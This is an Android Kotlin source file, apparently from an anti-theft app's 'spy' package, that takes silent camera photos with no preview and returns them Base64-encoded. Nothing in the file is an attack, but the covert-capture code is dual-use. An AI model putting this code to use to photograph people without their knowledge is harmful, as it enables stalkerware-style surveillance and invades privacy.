package com.antimaling.permanen.spy

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Base64
import com.antimaling.permanen.util.Perms
import java.io.ByteArrayOutputStream
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Foto diam-diam kamera depan/belakang tanpa preview (Camera2 + ImageReader).
 * Butuh izin CAMERA. Dijalankan di thread background, timeout 10 dtk (anti-hang).
 */
object CamSnap {

    data class SnapResult(val image: String, val err: String)

    fun snap(c: Context, front: Boolean): String? {
        val r = shoot(c, front)
        return if (r.image.isNotEmpty()) r.image else null
    }

    fun shoot(c: Context, front: Boolean): SnapResult {
        if (!Perms.camera(c)) return SnapResult("", "Izin kamera belum diberikan (aktifkan di app HP).")
        if (!c.packageManager.hasSystemFeature(android.content.pm.PackageManager.FEATURE_CAMERA_ANY))
            return SnapResult("", "HP tidak punya kamera.")
        var thread: HandlerThread? = null
        var reader: ImageReader? = null
        var cam: CameraDevice? = null
        try {
            val cm = c.getSystemService(CameraManager::class.java)
                ?: return SnapResult("", "CameraManager tidak tersedia.")
            val id = pick(c, cm, front) ?: return SnapResult("", "Kamera tidak ditemukan.")
            thread = HandlerThread("camsnap").apply { start() }
            val h = Handler(thread.looper)
            reader = ImageReader.newInstance(960, 720, ImageFormat.JPEG, 2)
            val latch = CountDownLatch(1)
            var bytes: ByteArray? = null
            reader.setOnImageAvailableListener({ r ->
                try {
                    val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
                    try {
                        val b = img.planes[0].buffer
                        val arr = ByteArray(b.remaining()); b.get(arr); bytes = arr
                    } finally { try { img.close() } catch (_: Exception) {} }
                    latch.countDown()
                } catch (_: Exception) { latch.countDown() }
            }, h)
            val openLatch = CountDownLatch(1)
            var err = false
            try {
                cm.openCamera(id, object : CameraDevice.StateCallback() {
                    override fun onOpened(d: CameraDevice) { cam = d; openLatch.countDown() }
                    override fun onDisconnected(d: CameraDevice) { err = true; openLatch.countDown() }
                    override fun onError(d: CameraDevice, e: Int) { err = true; openLatch.countDown() }
                }, h)
            } catch (_: SecurityException) { return SnapResult("", "Izin kamera ditolak sistem.") }
            if (!openLatch.await(8, TimeUnit.SECONDS) || err || cam == null)
                return SnapResult("", "Kamera sibuk/timeout (dipakai app lain?).")
            val dev = cam!!
            val sessLatch = CountDownLatch(1)
            var sess: android.hardware.camera2.CameraCaptureSession? = null
            dev.createCaptureSession(listOf(reader.surface), object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                override fun onConfigured(s: android.hardware.camera2.CameraCaptureSession) { sess = s; sessLatch.countDown() }
                override fun onConfigureFailed(s: android.hardware.camera2.CameraCaptureSession) { sessLatch.countDown() }
            }, h)
            if (!sessLatch.await(8, TimeUnit.SECONDS) || sess == null)
                return SnapResult("", "Sesi kamera gagal disiapkan.")
            val req = sess!!.device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
                addTarget(reader.surface)
                set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
            }.build()
            try { sess!!.capture(req, null, h) } catch (e: Exception) { return SnapResult("", "Capture gagal: ${e.message}") }
            latch.await(10, TimeUnit.SECONDS)
            val raw = bytes ?: return SnapResult("", "Sensor tidak mengirim gambar (timeout).")
            val b64 = compress(raw)
            if (b64.isNullOrBlank()) return SnapResult("", "Encode foto gagal.")
            return SnapResult(b64, "")
        } catch (e: Exception) { return SnapResult("", "Kamera error: ${e.message}") }
        finally {
            try { cam?.close() } catch (_: Exception) {}
            try { reader?.close() } catch (_: Exception) {}
            try { thread?.quitSafely() } catch (_: Exception) {}
        }
    }

    private fun pick(c: Context, cm: CameraManager, front: Boolean): String? {
        return try {
            val want = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            cm.cameraIdList.firstOrNull { id ->
                try { cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == want }
                catch (_: Exception) { false }
            } ?: cm.cameraIdList.firstOrNull()
        } catch (_: Exception) { null }
    }

    private fun compress(raw: ByteArray): String? {
        return try {
            var bmp = BitmapFactory.decodeByteArray(raw, 0, raw.size) ?: return Base64.encodeToString(raw, Base64.NO_WRAP)
            val scale = 960f / bmp.width.coerceAtLeast(1)
            if (scale < 1f) {
                val w = (bmp.width * scale).toInt(); val h = (bmp.height * scale).toInt()
                val s = Bitmap.createScaledBitmap(bmp, w, h, true)
                try { bmp.recycle() } catch (_: Exception) {}
                bmp = s
            }
            val out = ByteArrayOutputStream()
            bmp.compress(Bitmap.CompressFormat.JPEG, 55, out)
            try { bmp.recycle() } catch (_: Exception) {}
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) { null }
    }
}
